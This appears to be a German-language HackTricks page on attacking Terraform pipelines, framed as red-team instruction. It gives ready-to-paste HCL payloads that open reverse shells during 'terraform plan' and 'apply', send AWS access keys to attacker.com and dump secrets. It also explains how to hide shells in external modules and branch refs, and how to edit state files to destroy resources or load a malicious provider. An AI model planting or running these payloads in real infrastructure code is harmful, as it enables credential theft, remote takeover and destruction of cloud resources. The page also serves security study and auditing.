# Terraform Sicherheit

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## Grundlegende Informationen

[Aus der Dokumentation:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform ist ein **Infrastruktur als Code-Tool**, mit dem Sie sowohl **Cloud- als auch lokale Ressourcen** in menschenlesbaren Konfigurationsdateien definieren k√∂nnen, die Sie versionieren, wiederverwenden und teilen k√∂nnen. Sie k√∂nnen dann einen konsistenten Workflow verwenden, um Ihre gesamte Infrastruktur w√§hrend ihres Lebenszyklus bereitzustellen und zu verwalten. Terraform kann Low-Level-Komponenten wie Compute, Storage und Netzwerkressourcen sowie High-Level-Komponenten wie DNS-Eintr√§ge und SaaS-Funktionen verwalten.

### Wie funktioniert Terraform?

Terraform erstellt und verwaltet Ressourcen auf Cloud-Plattformen und anderen Diensten √ºber deren Anwendungsprogrammierschnittstellen (APIs). Anbieter erm√∂glichen es Terraform, mit praktisch jeder Plattform oder jedem Dienst mit einer zug√§nglichen API zu arbeiten.

![](<../.gitbook/assets/image (177).png>)

HashiCorp und die Terraform-Community haben bereits **mehr als 1700 Anbieter** geschrieben, um Tausende verschiedener Arten von Ressourcen und Diensten zu verwalten, und diese Zahl w√§chst weiter. Sie finden alle √∂ffentlich verf√ºgbaren Anbieter im [Terraform-Register](https://registry.terraform.io/), einschlie√ülich Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog und vielen mehr.

Der Kernworkflow von Terraform besteht aus drei Phasen:

* **Schreiben:** Sie definieren Ressourcen, die sich √ºber mehrere Cloud-Anbieter und Dienste erstrecken k√∂nnen. Sie k√∂nnten beispielsweise eine Konfiguration erstellen, um eine Anwendung auf virtuellen Maschinen in einem Virtual Private Cloud (VPC)-Netzwerk mit Sicherheitsgruppen und einem Lastenausgleicher bereitzustellen.
* **Planen:** Terraform erstellt einen Ausf√ºhrungsplan, der die Infrastruktur beschreibt, die es basierend auf der vorhandenen Infrastruktur und Ihrer Konfiguration erstellen, aktualisieren oder zerst√∂ren wird.
* **Anwenden:** Nach Genehmigung f√ºhrt Terraform die vorgeschlagenen Operationen in der richtigen Reihenfolge aus und ber√ºcksichtigt dabei alle Ressourcenabh√§ngigkeiten. Wenn Sie beispielsweise die Eigenschaften eines VPC aktualisieren und die Anzahl der virtuellen Maschinen in diesem VPC √§ndern, wird Terraform den VPC neu erstellen, bevor es die virtuellen Maschinen skaliert.

![](<../.gitbook/assets/image (215).png>)

## Terraform Labor

Installieren Sie einfach Terraform auf Ihrem Computer.

Hier finden Sie eine [Anleitung](https://learn.hashicorp.com/tutorials/terraform/install-cli) und hier finden Sie die [beste M√∂glichkeit, Terraform herunterzuladen](https://www.terraform.io/downloads).

## RCE in Terraform

Terraform hat **keine Plattform, die eine Webseite oder einen Netzwerkservice freigibt**, die wir aufz√§hlen k√∂nnen. Daher ist der einzige Weg, Terraform zu kompromittieren, zu **k√∂nnen Terraform-Konfigurationsdateien hinzuf√ºgen/√§ndern**.

Terraform ist jedoch eine **sehr sensible Komponente** zum Kompromittieren, da es **privilegierten Zugriff** auf verschiedene Standorte hat, damit es ordnungsgem√§√ü funktionieren kann.

Der Hauptweg f√ºr einen Angreifer, das System zu kompromittieren, auf dem Terraform ausgef√ºhrt wird, besteht darin, das Repository zu kompromittieren, das Terraform-Konfigurationen speichert, da sie irgendwann **interpretiert** werden.

Tats√§chlich gibt es L√∂sungen, die **terraform plan/apply automatisch ausf√ºhren, nachdem ein PR erstellt wurde**, wie z.B. **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Wenn es Ihnen gelingt, eine Terraform-Datei zu kompromittieren, gibt es verschiedene M√∂glichkeiten, wie Sie RCE durchf√ºhren k√∂nnen, wenn jemand `terraform plan` oder `terraform apply` ausf√ºhrt.

### Terraform plan

Terraform plan ist der **am h√§ufigsten verwendete Befehl** in Terraform, und Entwickler/L√∂sungen, die Terraform verwenden, rufen ihn die ganze Zeit auf. Daher ist der **einfachste Weg, RCE zu erhalten**, sicherzustellen, dass Sie eine Terraform-Konfigurationsdatei vergiften, die beliebige Befehle in einem `terraform plan` ausf√ºhrt.

#### Verwendung eines externen Anbieters

Terraform bietet den [`external`-Anbieter](https://registry.terraform.io/providers/hashicorp/external/latest/docs) an, der eine M√∂glichkeit bietet, zwischen Terraform und externen Programmen zu kommunizieren. Sie k√∂nnen die `external`-Datenquelle verwenden, um w√§hrend eines `plan` beliebigen Code auszuf√ºhren.

Das Einf√ºgen von etwas √Ñhnlichem in eine Terraform-Konfigurationsdatei wird beim Ausf√ºhren von `terraform plan` eine Reverse-Shell ausf√ºhren:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Verwendung eines benutzerdefinierten Anbieters

Ein Angreifer k√∂nnte einen [benutzerdefinierten Anbieter](https://learn.hashicorp.com/tutorials/terraform/provider-setup) an das [Terraform-Register](https://registry.terraform.io/) senden und ihn dann dem Terraform-Code in einem Feature-Zweig hinzuf√ºgen ([Beispiel von hier](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Der Anbieter wird im `init` heruntergeladen und f√ºhrt den b√∂sartigen Code aus, wenn `plan` ausgef√ºhrt wird.

Ein Beispiel finden Sie unter [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Verwendung eines externen Verweises

Beide genannten Optionen sind n√ºtzlich, aber nicht sehr unauff√§llig (die zweite ist unauff√§lliger, aber komplexer als die erste). Sie k√∂nnen diesen Angriff sogar auf eine **unauff√§lligere Weise** durchf√ºhren, indem Sie diesen Vorschl√§gen folgen:

* Anstatt den Reverse-Shell direkt in die Terraform-Datei einzuf√ºgen, k√∂nnen Sie eine **externe Ressource laden**, die die Reverse-Shell enth√§lt:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Du kannst den Rev Shell-Code unter [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) finden.

* Verwende im externen Ressourcenbereich die **ref**-Funktion, um den **Terraform Rev Shell-Code in einem Branch** im Repository zu verstecken, beispielsweise so: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform Apply wird ausgef√ºhrt, um alle √Ñnderungen anzuwenden. Du kannst es auch missbrauchen, um RCE zu erhalten, indem du **eine b√∂sartige Terraform-Datei mit** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** einschleust**.\
Du musst nur sicherstellen, dass ein Payload wie die folgenden in der `main.tf`-Datei endet:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Folgen Sie den **Vorschl√§gen aus der vorherigen Technik**, um diesen Angriff auf **unauff√§lligere Weise unter Verwendung externer Referenzen** durchzuf√ºhren.

## Geheimnisse Dump

Sie k√∂nnen **geheime Werte, die von Terraform verwendet werden, dumpen**, indem Sie `terraform apply` ausf√ºhren und etwas √Ñhnliches zur Terraform-Datei hinzuf√ºgen:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Ausnutzung von Terraform-Statusdateien

Falls Sie Schreibzugriff auf Terraform-Statusdateien haben, aber den Terraform-Code nicht √§ndern k√∂nnen, bietet [**diese Forschung**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) einige interessante M√∂glichkeiten, um von der Datei zu profitieren:

### L√∂schen von Ressourcen <a href="#deleting-resources" id="deleting-resources"></a>

Es gibt 2 M√∂glichkeiten, Ressourcen zu zerst√∂ren:

1. **F√ºgen Sie eine Ressource mit einem zuf√§lligen Namen in die Statusdatei ein, die auf die tats√§chliche zu zerst√∂rende Ressource zeigt**

Da Terraform feststellen wird, dass die Ressource nicht existieren sollte, wird sie zerst√∂rt (gem√§√ü der angegebenen tats√§chlichen Ressourcen-ID). Beispiel von der vorherigen Seite:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **√Ñndern Sie die Ressource, die gel√∂scht werden soll, so dass ein Update nicht m√∂glich ist (so wird sie gel√∂scht und neu erstellt)**

F√ºr eine EC2-Instanz reicht es aus, den Typ der Instanz zu √§ndern, damit Terraform sie l√∂scht und neu erstellt.

### RCE

Es ist auch m√∂glich, [einen benutzerdefinierten Anbieter zu erstellen](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) und einfach einen der Anbieter in der Terraform-Zustandsdatei durch den b√∂sartigen Anbieter zu ersetzen oder eine leere Ressource mit dem b√∂sartigen Anbieter hinzuzuf√ºgen. Beispiel aus der Originalforschung:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Audit-Tools

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec verwendet die statische Analyse Ihres Terraform-Codes, um potenzielle Fehlkonfigurationen zu erkennen.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan ist ein statischer Code-Analyzer f√ºr Infrastruktur als Code.

## Referenzen

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
